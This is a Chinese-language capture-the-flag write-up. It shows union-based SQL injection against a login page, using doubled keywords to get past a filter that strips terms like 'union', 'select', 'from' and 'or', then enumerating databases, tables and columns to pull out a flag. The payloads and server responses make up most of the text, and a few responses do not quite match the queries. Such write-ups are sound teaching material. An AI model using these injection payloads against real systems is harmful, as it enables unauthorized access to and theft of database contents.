看到登录页直接sql注入
user: 1'union  select 1#&password=1
密码任意
回显：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1#&passwd=1' and password='1’ 1#&passwd=1'' at line 1
可以发现这里union select都被过滤了
那就尝试双写绕过
user: 1'ununionion seselectlect 1#&password=1
密码任意
回显：The used SELECT statements have a different number of columns
显示列数不同，发现双写绕过是可行的
那就继续试列数
user: 1'ununionion seselectlect 1,2,3#&password=1
密码任意
回显：
Hello 2！
Your password is '3'
找到正确列数三列
接下来查询数据库
user: 1'ununionion seselectlect 1,version (),database()#&password=1
密码任意
回显：
Hello 10.3.18-MariaDB！
Your password is 'geek'
成功显示数据库
接着查询表名
user: 1'ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&password=1
密码任意
回显：
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.tables table_schema=database()#&passwd=1' and password='1’ 1#&passwd=1'' at line 1
可看出information,from被过滤
继续双写绕过
user: 1'ununionion seselectlect 1,2,group_concat(table_name) frfromom inforinformationmation_schema.tables where table_schema=database()#&password=1
回显：
Table 'infinfmationmation_schema.schemata' doesn't exist
发现他只删除了or所以只需要双写or
user: 1'ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#&password=1
回显：
Hello 2！
Your password is 'information_schema,performance_schema,test,mysql,ctf,geek'
可看出所有的数据库information_schema,mysql ,performance_schema,test,ctf,geek
查询表名继续使用联合查询需要双写的有information，from，where
user: 1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=’geek’#&password=1
回显：
Unknown column '’geek’' in 'where clause'
得到geek数据库里的表b4bsql,geekuser，发现flag不在此数据库中
因此直接试ctf的表
user: 1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema='ctf'#&password=1
回显：
Hello 2！
Your password is 'Flag'
发现ctf数据库中存在Flag表
接着查询flag中内容
user: 1’ ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#&password=1
回显：
Hello 2！
Your password is 'flag{341e1f75-ab86-40bf-81d6-53a97e2a8081}'